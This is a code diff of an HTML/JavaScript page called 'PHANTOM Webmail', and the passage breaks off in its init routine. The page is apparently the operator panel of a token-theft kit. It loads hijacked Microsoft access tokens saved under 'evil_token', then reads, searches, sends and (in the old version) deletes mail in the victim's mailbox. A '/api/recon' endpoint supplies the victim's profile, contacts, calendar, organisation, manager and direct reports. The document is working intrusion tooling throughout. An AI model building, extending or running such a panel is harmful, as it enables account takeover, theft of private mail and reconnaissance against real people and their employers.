@@ -3,35 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📧 Webmail</title>
+    <title>PHANTOM Webmail</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap');
-
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', sans-serif;
-            background: radial-gradient(circle at 20% 30%, #0a0e17, #030507);
-            min-height: 100vh;
-            padding: 20px;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #0a0e17;
             color: #e0e8f0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
-        .glass {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(16px) saturate(180%);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 16px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
-        }
-        .container { max-width: 1400px; margin: 0 auto; }
-
         .header {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+            padding: 12px 24px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 16px 24px;
-            margin-bottom: 20px;
         }
-        .header h1 { font-size: 22px; background: linear-gradient(135deg, #b388ff, #82b1ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .header h1 { font-size: 20px; font-weight: 600; background: linear-gradient(135deg, #b388ff, #82b1ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .header-actions { display: flex; gap: 12px; align-items: center; }
         .header-actions input {
             background: rgba(255,255,255,0.06);
@@ -39,393 +31,622 @@
             border-radius: 40px;
             padding: 8px 18px;
             color: #e0e8f0;
-            font-size: 13px;
+            width: 250px;
             outline: none;
-            width: 200px;
-            transition: 0.2s;
         }
-        .header-actions input:focus { border-color: #7c4dff; box-shadow: 0 0 0 3px rgba(124,77,255,0.2); }
-        .header-actions input::placeholder { color: rgba(255,255,255,0.3); }
-        .btn {
+        .header-actions input:focus { border-color: #7c4dff; }
+        .header-actions button {
             background: rgba(255,255,255,0.06);
-            border: 1px solid rgba(255,255,255,0.12);
+            border: 1px solid rgba(255,255,255,0.1);
             color: #e0e8f0;
             padding: 8px 18px;
             border-radius: 40px;
-            font-weight: 500;
-            font-size: 13px;
             cursor: pointer;
-            transition: all 0.2s;
-        }
-        .btn:hover { background: rgba(255,255,255,0.14); border-color: rgba(255,255,255,0.25); }
-        .btn-primary { background: linear-gradient(135deg, #536dfe, #7c4dff); border-color: transparent; color: #fff; }
-        .btn-primary:hover { background: linear-gradient(135deg, #6a7ffc, #9464ff); }
-
-        .main-grid {
-            display: grid;
-            grid-template-columns: 220px 1fr 350px;
-            gap: 20px;
-            height: calc(100vh - 160px);
-        }
-
-        /* Sidebar */
-        .sidebar { padding: 16px; overflow-y: auto; }
-        .sidebar .folder { 
-            padding: 8px 14px; 
-            border-radius: 8px; 
-            cursor: pointer; 
             transition: 0.2s;
-            margin-bottom: 2px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 14px;
         }
-        .sidebar .folder:hover { background: rgba(255,255,255,0.06); }
-        .sidebar .folder.active { background: rgba(124,77,255,0.2); border-left: 3px solid #7c4dff; }
-        .sidebar .folder .count { font-size: 12px; color: rgba(255,255,255,0.4); }
-
-        /* Email List */
-        .email-list { padding: 12px 16px; overflow-y: auto; }
-        .email-item {
-            padding: 12px 16px;
-            border-radius: 10px;
+        .header-actions button:hover { background: rgba(255,255,255,0.12); }
+        .btn-primary { background: linear-gradient(135deg, #536dfe, #7c4dff) !important; border-color: transparent !important; color: #fff !important; }
+        
+        .main {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+        .sidebar {
+            width: 220px;
+            background: rgba(255,255,255,0.03);
+            border-right: 1px solid rgba(255,255,255,0.06);
+            padding: 16px 0;
+            overflow-y: auto;
+            flex-shrink: 0;
+        }
+        .sidebar-item {
+            padding: 10px 20px;
             cursor: pointer;
-            transition: 0.15s;
-            display: grid;
-            grid-template-columns: 30px 180px 1fr 120px;
-            gap: 12px;
+            transition: 0.2s;
+            border-left: 3px solid transparent;
+            font-size: 14px;
+            display: flex;
             align-items: center;
+            gap: 10px;
+        }
+        .sidebar-item:hover { background: rgba(255,255,255,0.04); }
+        .sidebar-item.active { background: rgba(124,77,255,0.1); border-left-color: #7c4dff; color: #b388ff; }
+        .sidebar-item .badge {
+            margin-left: auto;
+            background: rgba(255,215,0,0.15);
+            color: #ffd700;
+            padding: 1px 10px;
+            border-radius: 40px;
+            font-size: 11px;
+        }
+        .sidebar-divider {
+            border-top: 1px solid rgba(255,255,255,0.05);
+            margin: 8px 20px;
+        }
+        .sidebar-profile {
+            padding: 16px 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            margin-bottom: 8px;
+        }
+        .sidebar-profile .name { font-weight: 600; font-size: 14px; }
+        .sidebar-profile .email { font-size: 12px; color: rgba(255,255,255,0.4); }
+        
+        .email-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px 0;
+        }
+        .email-item {
+            padding: 12px 20px;
             border-bottom: 1px solid rgba(255,255,255,0.04);
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            gap: 16px;
+            align-items: flex-start;
         }
         .email-item:hover { background: rgba(255,255,255,0.04); }
-        .email-item.unread { font-weight: 600; background: rgba(130,177,255,0.05); }
-        .email-item .from { font-size: 14px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .email-item .subject { font-size: 14px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: rgba(255,255,255,0.8); }
-        .email-item .date { font-size: 12px; color: rgba(255,255,255,0.4); text-align: right; }
-        .email-item .status { font-size: 16px; }
-
-        /* Email Preview */
-        .email-preview { padding: 16px; overflow-y: auto; }
-        .email-preview .subject { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
-        .email-preview .meta { font-size: 13px; color: rgba(255,255,255,0.5); margin-bottom: 16px; }
-        .email-preview .body { font-size: 14px; line-height: 1.7; white-space: pre-wrap; }
-        .email-preview .body img { max-width: 100%; }
-
-        .loading { text-align: center; padding: 40px; color: rgba(255,255,255,0.4); }
-
-        /* Scrollbar */
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 10px; }
-
-        @media (max-width: 1024px) {
-            .main-grid { grid-template-columns: 1fr; height: auto; }
-            .sidebar { display: none; }
-            .email-preview { display: none; }
+        .email-item .avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #536dfe, #7c4dff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+            flex-shrink: 0;
+            color: #fff;
+        }
+        .email-item .content { flex: 1; min-width: 0; }
+        .email-item .subject { font-weight: 500; font-size: 14px; }
+        .email-item .from { font-size: 13px; color: rgba(255,255,255,0.6); }
+        .email-item .preview { font-size: 13px; color: rgba(255,255,255,0.4); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .email-item .date { font-size: 12px; color: rgba(255,255,255,0.3); flex-shrink: 0; }
+        .email-item.unread .subject { font-weight: 700; }
+        .email-item.unread .from { color: rgba(255,255,255,0.8); }
+        .email-item .importance {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            margin-top: 4px;
+        }
+        .importance.high { background: #ff1744; }
+        .importance.normal { background: #ffab40; }
+        .importance.low { background: #69db7c; }
+        
+        .email-view {
+            display: none;
+            flex: 1;
+            flex-direction: column;
+            background: rgba(255,255,255,0.02);
+            padding: 20px 24px;
+            overflow-y: auto;
+        }
+        .email-view.active { display: flex; }
+        .email-view .back { cursor: pointer; color: rgba(255,255,255,0.4); margin-bottom: 16px; }
+        .email-view .back:hover { color: #fff; }
+        .email-view .subject { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
+        .email-view .meta { font-size: 14px; color: rgba(255,255,255,0.5); margin-bottom: 16px; }
+        .email-view .body { font-size: 14px; line-height: 1.7; white-space: pre-wrap; }
+        .email-view .body img { max-width: 100%; }
+        
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: rgba(255,255,255,0.3);
+        }
+        .empty-state .icon { font-size: 48px; margin-bottom: 16px; }
+        
+        .status-bar {
+            background: rgba(255,255,255,0.03);
+            border-top: 1px solid rgba(255,255,255,0.05);
+            padding: 8px 24px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.3);
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        @media (max-width: 768px) {
+            .sidebar { width: 60px; }
+            .sidebar-item span:not(.icon) { display: none; }
+            .sidebar-item .badge { display: none; }
+            .sidebar-profile .email { display: none; }
+            .header-actions input { width: 120px; }
         }
     </style>
 </head>
 <body>
-<div class="container">
-    <!-- Header -->
-    <div class="header glass">
+    <div class="header">
         <h1>📧 PHANTOM Webmail</h1>
         <div class="header-actions">
-            <input type="text" id="searchInput" placeholder="Search emails..." onkeydown="if(event.key==='Enter') searchEmails()">
-            <button class="btn" onclick="refreshMailbox()">🔄 Refresh</button>
-            <button class="btn btn-primary" onclick="composeEmail()">✏️ Compose</button>
+            <input type="text" placeholder="🔍 Search emails..." id="searchInput" onkeyup="if(event.key==='Enter') searchEmails()">
+            <button onclick="searchEmails()">Search</button>
+            <button onclick="refreshInbox()">🔄 Refresh</button>
+            <button class="btn-primary" onclick="composeEmail()">✏️ Compose</button>
         </div>
     </div>
-
-    <!-- Main Grid -->
-    <div class="main-grid">
-        <!-- Sidebar -->
-        <div class="sidebar glass" id="sidebar">
-            <div class="folder active" data-folder="inbox" onclick="switchFolder('inbox')">
-                📥 Inbox <span class="count" id="inboxCount">-</span>
+    
+    <div class="main">
+        <div class="sidebar" id="sidebar">
+            <div class="sidebar-profile" id="profileInfo">
+                <div class="name">Loading...</div>
+                <div class="email">Loading...</div>
             </div>
-            <div class="folder" data-folder="sent" onclick="switchFolder('sent')">
-                📤 Sent <span class="count" id="sentCount">-</span>
+            <div class="sidebar-item active" data-folder="inbox" onclick="loadFolder('inbox')">
+                <span>📬</span> <span>Inbox</span>
+                <span class="badge" id="inboxCount">0</span>
             </div>
-            <div class="folder" data-folder="drafts" onclick="switchFolder('drafts')">
-                📝 Drafts <span class="count" id="draftsCount">-</span>
+            <div class="sidebar-item" data-folder="sent" onclick="loadFolder('sent')">
+                <span>📤</span> <span>Sent</span>
             </div>
-            <div class="folder" data-folder="archive" onclick="switchFolder('archive')">
-                📦 Archive <span class="count" id="archiveCount">-</span>
+            <div class="sidebar-item" data-folder="drafts" onclick="loadFolder('drafts')">
+                <span>📝</span> <span>Drafts</span>
             </div>
-            <hr style="border-color:rgba(255,255,255,0.05); margin: 12px 0;">
-            <div style="font-size:12px; color:rgba(255,255,255,0.3); padding:8px 14px;" id="emailInfo">
-                Loading...
+            <div class="sidebar-item" data-folder="trash" onclick="loadFolder('trash')">
+                <span>🗑️</span> <span>Trash</span>
+            </div>
+            <div class="sidebar-divider"></div>
+            <div class="sidebar-item" onclick="loadContacts()">
+                <span>📇</span> <span>Contacts</span>
+            </div>
+            <div class="sidebar-item" onclick="loadCalendar()">
+                <span>📅</span> <span>Calendar</span>
+            </div>
+            <div class="sidebar-item" onclick="loadOrganization()">
+                <span>🏢</span> <span>Organization</span>
             </div>
         </div>
-
-        <!-- Email List -->
-        <div class="email-list glass" id="emailList">
-            <div class="loading">📨 Loading emails...</div>
+        
+        <div class="email-list" id="emailList">
+            <div class="empty-state">
+                <div class="icon">📬</div>
+                <p>Select a folder to view emails</p>
+                <p style="font-size:12px; margin-top:8px;">No token loaded — please use the dashboard to select a session</p>
+            </div>
         </div>
-
-        <!-- Email Preview -->
-        <div class="email-preview glass" id="emailPreview">
-            <div class="loading">👈 Select an email to preview</div>
+        
+        <div class="email-view" id="emailView">
+            <div class="back" onclick="closeEmailView()">← Back to inbox</div>
+            <div class="subject" id="viewSubject">Subject</div>
+            <div class="meta" id="viewMeta">From: sender@example.com · Today 12:00 PM</div>
+            <div class="body" id="viewBody">Loading email body...</div>
         </div>
     </div>
-</div>
+    
+    <div class="status-bar">
+        <span id="statusText">📡 Connected</span>
+        <span id="tokenStatus">🔑 Token: Valid</span>
+    </div>
 
-<script>
-    let currentFolder = 'inbox';
-    let currentAccessToken = null;
-    let currentEmail = null;
-    let selectedEmailId = null;
+    <script>
+        // =============================================
+        // GLOBALS
+        // =============================================
+        let accessToken = null;
+        let currentFolder = 'inbox';
+        let currentEmailId = null;
+        let emails = [];
+        let userProfile = null;
+        let refreshInterval = null;
 
-    // ---------- Get Access Token from Storage ----------
-    function getAccessToken() {
-        if (currentAccessToken) return currentAccessToken;
-        const stored = localStorage.getItem('evil_token');
-        if (stored) {
+        // Try to get token from localStorage (set by dashboard)
+        function getTokenFromStorage() {
             try {
-                const data = JSON.parse(stored);
-                currentAccessToken = data.access_token;
-                return currentAccessToken;
-            } catch (e) {}
+                const data = JSON.parse(localStorage.getItem('evil_token'));
+                if (data && data.access_token) {
+                    accessToken = data.access_token;
+                    return true;
+                }
+                // Also try direct token
+                const token = localStorage.getItem('evil_token_direct');
+                if (token) {
+                    accessToken = token;
+                    return true;
+                }
+                // Fallback: prompt user
+                const input = prompt('Enter your access token:', '');
+                if (input && input.length > 10) {
+                    accessToken = input;
+                    localStorage.setItem('evil_token_direct', input);
+                    return true;
+                }
+                return false;
+            } catch (e) {
+                return false;
+            }
         }
-        // Prompt user for token
-        const token = prompt('🔑 Enter your Microsoft access token:');
-        if (token) {
-            currentAccessToken = token;
-            localStorage.setItem('evil_token', JSON.stringify({ access_token: token }));
+
+        // =============================================
+        // API HELPERS
+        // =============================================
+        async function apiCall(endpoint, method = 'POST', body = null) {
+            if (!accessToken) {
+                if (!getTokenFromStorage()) {
+                    alert('No access token found. Please go to the dashboard and select a session.');
+                    return null;
+                }
+            }
+            const options = {
+                method: method,
+                headers: {
+                    'Content-Type': 'application/json',
+                }
+            };
+            if (body) options.body = JSON.stringify({ accessToken, ...body });
+            
+            const res = await fetch(`/dash${endpoint}`, options);
+            const data = await res.json();
+            if (data.error) {
+                if (data.error.includes('expired') || data.error.includes('invalid')) {
+                    alert('Token expired. Please refresh from the dashboard.');
+                    accessToken = null;
+                    localStorage.removeItem('evil_token');
+                }
+                throw new Error(data.error);
+            }
+            return data;
         }
-        return currentAccessToken;
-    }
 
-    // ---------- API Calls ----------
-    async function apiCall(endpoint, data) {
-        const token = getAccessToken();
-        if (!token) {
-            alert('Access token required. Please enter one.');
-            return null;
+        // =============================================
+        // LOAD PROFILE
+        // =============================================
+        async function loadProfile() {
+            try {
+                const data = await apiCall('/api/recon');
+                if (data && data.profile) {
+                    userProfile = data.profile;
+                    document.getElementById('profileInfo').innerHTML = `
+                        <div class="name">${userProfile.displayName || 'Unknown'}</div>
+                        <div class="email">${userProfile.mail || userProfile.userPrincipalName || 'No email'}</div>
+                    `;
+                    document.getElementById('statusText').textContent = `👤 ${userProfile.displayName || 'User'}`;
+                }
+            } catch (e) {
+                console.error('Failed to load profile:', e);
+            }
         }
-        const response = await fetch(`/dash/api/webmail/${endpoint}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ ...data, accessToken: token })
-        });
-        const result = await response.json();
-        if (result.error) {
-            alert('Error: ' + result.error);
-            return null;
+
+        // =============================================
+        // LOAD FOLDER
+        // =============================================
+        async function loadFolder(folder) {
+            currentFolder = folder;
+            document.querySelectorAll('.sidebar-item').forEach(el => el.classList.remove('active'));
+            document.querySelector(`[data-folder="${folder}"]`)?.classList.add('active');
+            
+            document.getElementById('emailView').classList.remove('active');
+            document.getElementById('emailList').style.display = 'block';
+            
+            try {
+                const data = await apiCall('/api/webmail/emails', 'POST', { 
+                    folderId: folder, 
+                    limit: 50, 
+                    skip: 0 
+                });
+                if (data && data.emails) {
+                    emails = data.emails;
+                    renderEmailList(emails);
+                    updateBadge(folder, emails.length);
+                } else {
+                    document.getElementById('emailList').innerHTML = `<div class="empty-state"><div class="icon">📭</div><p>No emails in ${folder}</p></div>`;
+                }
+            } catch (e) {
+                document.getElementById('emailList').innerHTML = `<div class="empty-state"><div class="icon">❌</div><p>Error loading emails: ${e.message}</p></div>`;
+            }
         }
-        return result;
-    }
 
-    // ---------- Load Folders ----------
-    async function loadFolders() {
-        const result = await apiCall('folders', {});
-        if (result) {
-            // Update counts
-            result.folders.forEach(f => {
-                const el = document.getElementById(f.id + 'Count');
-                if (el) el.textContent = f.totalItemCount || 0;
-            });
-        }
-    }
-
-    // ---------- Switch Folder ----------
-    async function switchFolder(folderId) {
-        currentFolder = folderId;
-        document.querySelectorAll('.folder').forEach(f => f.classList.remove('active'));
-        document.querySelector(`.folder[data-folder="${folderId}"]`)?.classList.add('active');
-        await loadEmails(folderId);
-    }
-
-    // ---------- Load Emails ----------
-    async function loadEmails(folderId = 'inbox', limit = 50) {
-        const list = document.getElementById('emailList');
-        list.innerHTML = '<div class="loading">📨 Loading emails...</div>';
-
-        const result = await apiCall('emails', { folderId, limit });
-        if (result && result.emails) {
-            if (result.emails.length === 0) {
-                list.innerHTML = '<div class="loading">📭 No emails in this folder</div>';
+        function renderEmailList(emails) {
+            const container = document.getElementById('emailList');
+            if (!emails || emails.length === 0) {
+                container.innerHTML = `<div class="empty-state"><div class="icon">📭</div><p>No emails in this folder</p></div>`;
                 return;
             }
-            list.innerHTML = '';
-            result.emails.forEach(email => {
+            container.innerHTML = '';
+            emails.forEach(email => {
                 const div = document.createElement('div');
-                div.className = 'email-item' + (email.isRead ? '' : ' unread');
-                div.dataset.id = email.id;
+                div.className = `email-item${email.isRead === false ? ' unread' : ''}`;
+                const sender = email.sender?.emailAddress?.address || 'Unknown';
+                const initials = sender.charAt(0).toUpperCase();
+                const subject = email.subject || '(No subject)';
+                const preview = email.bodyPreview || '';
+                const date = new Date(email.receivedDateTime).toLocaleString();
+                const importanceClass = email.importance === 'high' ? 'high' : email.importance === 'low' ? 'low' : 'normal';
+                
                 div.innerHTML = `
-                    <span class="status">${email.isRead ? '📩' : '📨'}</span>
-                    <span class="from">${email.sender?.emailAddress?.address || 'Unknown'}</span>
-                    <span class="subject">${email.subject || '(no subject)'}</span>
-                    <span class="date">${new Date(email.receivedDateTime).toLocaleString()}</span>
+                    <div class="avatar">${initials}</div>
+                    <div class="content">
+                        <div class="subject">${subject}</div>
+                        <div class="from">${sender}</div>
+                        <div class="preview">${preview}</div>
+                    </div>
+                    <div class="date">${date}</div>
+                    <div class="importance ${importanceClass}"></div>
                 `;
-                div.onclick = () => viewEmail(email.id);
-                list.appendChild(div);
+                div.onclick = () => loadEmail(email.id);
+                container.appendChild(div);
             });
-            document.getElementById('emailInfo').textContent = `${result.emails.length} emails loaded`;
         }
-    }
 
-    // ---------- View Email ----------
-    async function viewEmail(messageId) {
-        const preview = document.getElementById('emailPreview');
-        preview.innerHTML = '<div class="loading">📖 Loading email...</div>';
-
-        const result = await apiCall('email', { messageId });
-        if (result && result.email) {
-            const email = result.email;
-            currentEmail = email;
-            selectedEmailId = messageId;
-            const body = email.body?.content || 'No body content.';
-            preview.innerHTML = `
-                <div class="subject">${email.subject || '(no subject)'}</div>
-                <div class="meta">
-                    From: ${email.sender?.emailAddress?.address || 'Unknown'}<br>
-                    To: ${email.toRecipients?.map(r => r.emailAddress.address).join(', ') || 'Unknown'}<br>
-                    Date: ${new Date(email.receivedDateTime).toLocaleString()}<br>
-                    ${email.hasAttachments ? '📎 Has attachments' : ''}
-                    ${email.importance ? `⭐ Importance: ${email.importance}` : ''}
-                </div>
-                <hr style="border-color:rgba(255,255,255,0.05); margin: 12px 0;">
-                <div class="body">${body}</div>
-                <hr style="border-color:rgba(255,255,255,0.05); margin: 12px 0;">
-                <div style="display:flex; gap:10px; margin-top:12px;">
-                    <button class="btn" onclick="replyEmail()">↩️ Reply</button>
-                    <button class="btn" onclick="forwardEmail()">↪️ Forward</button>
-                    <button class="btn" onclick="deleteEmail()">🗑️ Delete</button>
-                </div>
-            `;
-        }
-    }
-
-    // ---------- Reply Email ----------
-    function replyEmail() {
-        if (!currentEmail) return;
-        const body = `\n\n\n--- Original Message ---\nFrom: ${currentEmail.sender?.emailAddress?.address}\nSubject: ${currentEmail.subject}\n${currentEmail.body?.content || ''}`;
-        const to = currentEmail.sender?.emailAddress?.address || '';
-        composeEmail(to, `Re: ${currentEmail.subject}`, body);
-    }
-
-    // ---------- Forward Email ----------
-    function forwardEmail() {
-        if (!currentEmail) return;
-        const body = `\n\n\n--- Forwarded Message ---\nFrom: ${currentEmail.sender?.emailAddress?.address}\nSubject: ${currentEmail.subject}\n${currentEmail.body?.content || ''}`;
-        composeEmail('', `Fwd: ${currentEmail.subject}`, body);
-    }
-
-    // ---------- Compose Email ----------
-    function composeEmail(to = '', subject = '', body = '') {
-        const composeDiv = document.getElementById('emailPreview');
-        composeDiv.innerHTML = `
-            <div style="display:flex; flex-direction:column; gap:12px;">
-                <h3>✏️ New Email</h3>
-                <input type="text" id="composeTo" placeholder="To..." value="${to}" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:10px 14px;color:white;outline:none;">
-                <input type="text" id="composeSubject" placeholder="Subject..." value="${subject}" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:10px 14px;color:white;outline:none;">
-                <textarea id="composeBody" rows="12" placeholder="Message..." style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:10px 14px;color:white;outline:none;resize:vertical;font-family:inherit;">${body}</textarea>
-                <div style="display:flex; gap:10px;">
-                    <button class="btn btn-primary" onclick="sendEmail()">📤 Send</button>
-                    <button class="btn" onclick="loadEmails(currentFolder)">✖ Cancel</button>
-                </div>
-            </div>
-        `;
-    }
-
-    // ---------- Send Email ----------
-    async function sendEmail() {
-        const to = document.getElementById('composeTo').value.split(',').map(e => e.trim()).filter(Boolean);
-        const subject = document.getElementById('composeSubject').value;
-        const body = document.getElementById('composeBody').value;
-        if (to.length === 0 || !subject || !body) {
-            alert('Please fill in all fields.');
-            return;
-        }
-        const result = await apiCall('send', { to, subject, body });
-        if (result && result.success) {
-            alert('✅ Email sent!');
-            loadEmails(currentFolder);
-        }
-    }
-
-    // ---------- Delete Email ----------
-    async function deleteEmail() {
-        if (!selectedEmailId) return;
-        if (!confirm('Delete this email?')) return;
-        // Graph API delete requires a different method
-        const token = getAccessToken();
-        if (!token) return;
-        try {
-            const response = await fetch(`https://graph.microsoft.com/v1.0/me/messages/${selectedEmailId}`, {
-                method: 'DELETE',
-                headers: { 'Authorization': `Bearer ${token}` }
-            });
-            if (response.ok) {
-                alert('✅ Email deleted.');
-                loadEmails(currentFolder);
-            } else {
-                alert('❌ Delete failed.');
+        function updateBadge(folder, count) {
+            if (folder === 'inbox') {
+                document.getElementById('inboxCount').textContent = count;
             }
-        } catch (e) {
-            alert('Error: ' + e.message);
         }
-    }
 
-    // ---------- Search Emails ----------
-    async function searchEmails() {
-        const query = document.getElementById('searchInput').value.trim();
-        if (!query) { loadEmails(currentFolder); return; }
-        const list = document.getElementById('emailList');
-        list.innerHTML = '<div class="loading">🔍 Searching...</div>';
-        const result = await apiCall('search', { query, folderId: currentFolder });
-        if (result && result.emails) {
-            if (result.emails.length === 0) {
-                list.innerHTML = '<div class="loading">🔍 No results found</div>';
+        // =============================================
+        // LOAD SINGLE EMAIL
+        // =============================================
+        async function loadEmail(emailId) {
+            try {
+                const data = await apiCall('/api/webmail/email', 'POST', { messageId: emailId });
+                if (data && data.email) {
+                    const email = data.email;
+                    currentEmailId = emailId;
+                    document.getElementById('emailList').style.display = 'none';
+                    document.getElementById('emailView').classList.add('active');
+                    document.getElementById('viewSubject').textContent = email.subject || '(No subject)';
+                    const sender = email.sender?.emailAddress?.address || 'Unknown';
+                    const date = new Date(email.receivedDateTime).toLocaleString();
+                    document.getElementById('viewMeta').textContent = `From: ${sender} · ${date}`;
+                    document.getElementById('viewBody').innerHTML = email.body?.content || 'No content available.';
+                }
+            } catch (e) {
+                alert('Failed to load email: ' + e.message);
+            }
+        }
+
+        function closeEmailView() {
+            document.getElementById('emailView').classList.remove('active');
+            document.getElementById('emailList').style.display = 'block';
+            loadFolder(currentFolder);
+        }
+
+        // =============================================
+        // SEARCH
+        // =============================================
+        async function searchEmails() {
+            const query = document.getElementById('searchInput').value.trim();
+            if (!query) { loadFolder(currentFolder); return; }
+            try {
+                const data = await apiCall('/api/webmail/search', 'POST', { 
+                    query: query, 
+                    folderId: currentFolder,
+                    limit: 50 
+                });
+                if (data && data.emails) {
+                    renderEmailList(data.emails);
+                }
+            } catch (e) {
+                alert('Search failed: ' + e.message);
+            }
+        }
+
+        // =============================================
+        // COMPOSE
+        // =============================================
+        function composeEmail() {
+            const to = prompt('To:', '');
+            if (!to) return;
+            const subject = prompt('Subject:', '');
+            if (subject === null) return;
+            const body = prompt('Body:', '');
+            if (body === null) return;
+            
+            apiCall('/api/webmail/send', 'POST', {
+                to: to.split(',').map(s => s.trim()),
+                subject: subject,
+                body: body
+            }).then(() => {
+                alert('✅ Email sent!');
+                loadFolder(currentFolder);
+            }).catch(e => {
+                alert('Failed to send: ' + e.message);
+            });
+        }
+
+        // =============================================
+        // CONTACTS / CALENDAR / ORG (Stubs)
+        // =============================================
+        async function loadContacts() {
+            try {
+                const data = await apiCall('/api/recon');
+                if (data && data.contacts) {
+                    const container = document.getElementById('emailList');
+                    document.getElementById('emailView').classList.remove('active');
+                    container.style.display = 'block';
+                    if (data.contacts.length === 0) {
+                        container.innerHTML = `<div class="empty-state"><div class="icon">📇</div><p>No contacts found</p></div>`;
+                        return;
+                    }
+                    let html = '<div style="padding:16px;"><h3 style="margin-bottom:12px;">📇 Contacts</h3>';
+                    data.contacts.forEach(c => {
+                        const name = c.displayName || 'Unknown';
+                        const email = c.emailAddresses?.[0]?.address || 'No email';
+                        html += `<div style="padding:8px 0; border-bottom:1px solid rgba(255,255,255,0.04);">
+                            <strong>${name}</strong> — ${email}
+                        </div>`;
+                    });
+                    html += '</div>';
+                    container.innerHTML = html;
+                }
+            } catch (e) {
+                alert('Failed to load contacts: ' + e.message);
+            }
+        }
+
+        async function loadCalendar() {
+            try {
+                const data = await apiCall('/api/recon');
+                if (data && data.events) {
+                    const container = document.getElementById('emailList');
+                    document.getElementById('emailView').classList.remove('active');
+                    container.style.display = 'block';
+                    if (data.events.length === 0) {
+                        container.innerHTML = `<div class="empty-state"><div class="icon">📅</div><p>No upcoming events</p></div>`;
+                        return;
+                    }
+                    let html = '<div style="padding:16px;"><h3 style="margin-bottom:12px;">📅 Calendar Events</h3>';
+                    data.events.forEach(e => {
+                        const subject = e.subject || 'Untitled';
+                        const start = new Date(e.start?.dateTime).toLocaleString();
+                        html += `<div style="padding:8px 0; border-bottom:1px solid rgba(255,255,255,0.04);">
+                            <strong>${subject}</strong><br>
+                            <span style="font-size:12px; color:rgba(255,255,255,0.5);">${start}</span>
+                        </div>`;
+                    });
+                    html += '</div>';
+                    container.innerHTML = html;
+                }
+            } catch (e) {
+                alert('Failed to load calendar: ' + e.message);
+            }
+        }
+
+        async function loadOrganization() {
+            try {
+                const data = await apiCall('/api/recon');
+                if (data && data.organization) {
+                    const org = data.organization;
+                    const container = document.getElementById('emailList');
+                    document.getElementById('emailView').classList.remove('active');
+                    container.style.display = 'block';
+                    container.innerHTML = `
+                        <div style="padding:16px;">
+                            <h3 style="margin-bottom:12px;">🏢 Organization</h3>
+                            <div style="padding:8px 0; border-bottom:1px solid rgba(255,255,255,0.04);">
+                                <strong>Name:</strong> ${org.displayName || 'N/A'}
+                            </div>
+                            <div style="padding:8px 0; border-bottom:1px solid rgba(255,255,255,0.04);">
+                                <strong>Domain:</strong> ${org.verifiedDomains?.[0] || 'N/A'}
+                            </div>
+                            <div style="padding:8px 0; border-bottom:1px solid rgba(255,255,255,0.04);">
+                                <strong>Industry:</strong> ${org.industry || 'N/A'}
+                            </div>
+                            <div style="padding:8px 0;">
+                                <strong>Country:</strong> ${org.address?.country || 'N/A'}
+                            </div>
+                            ${data.manager ? `<div style="padding:8px 0; margin-top:8px; border-top:1px solid rgba(255,255,255,0.06);">
+                                <strong>Manager:</strong> ${data.manager.displayName || data.manager.userPrincipalName || 'Unknown'}
+                            </div>` : ''}
+                            ${data.directReports && data.directReports.length > 0 ? `
+                                <div style="padding:8px 0; margin-top:4px;">
+                                    <strong>Direct Reports (${data.directReports.length}):</strong>
+                                    ${data.directReports.map(r => r.displayName || r.userPrincipalName).join(', ')}
+                                </div>
+                            ` : ''}
+                        </div>
+                    `;
+                }
+            } catch (e) {
+                alert('Failed to load organization: ' + e.message);
+            }
+        }
+
+        // =============================================
+        // REFRESH
+        // =============================================
+        function refreshInbox() {
+            if (currentFolder) loadFolder(currentFolder);
+        }
+
+        // =============================================
+        // AUTO-REFRESH
+        // =============================================
+        function startAutoRefresh() {
+            if (refreshInterval) clearInterval(refreshInterval);
+            refreshInterval = setInterval(() => {
+                if (document.querySelector('#emailView.active') === null) {
+                    refreshInbox();
+                }
+            }, 30000);
+        }
+
+        // =============================================
+        // INIT
+        // =============================================
+        async function init() {
+            if (!getTokenFromStorage()) {
+                document.getElementById('emailList').innerHTML = `
+                    <div class="empty-state">
+                        <div class="icon">🔑</div>
+                        <p>No access token found</p>
+                        <p style="font-size:12px; margin-top:8px;">
+                            Go to the <a href="/dash" style="color:#b388ff;">dashboard</a>, 
